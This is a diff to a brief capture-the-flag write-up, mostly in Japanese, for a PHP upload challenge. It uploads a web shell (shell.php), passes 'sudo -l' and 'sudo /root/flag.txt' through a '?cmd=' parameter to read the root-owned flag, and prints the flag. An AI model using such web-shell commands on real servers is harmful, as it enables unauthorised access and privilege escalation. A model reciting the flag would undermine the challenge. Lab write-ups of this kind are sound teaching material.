@@ -19,5 +19,12 @@ PRINCE NIYONSHUTI N.
 
 ### Write-up
 **1.** 
-`shell.phpを送信`
-**2. **
+  `shell.phpを送信`
+**2.**
+    `?cmd=sudo -l`を入力し，`Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL`
+**3.**
+  `?cmd=sudo /root/flag.txt`を入力flagを入手
+
+
+### Flag
+`FLAG : picoCTF{wh47_c4n_u_d0_wPHP_d698d800}`
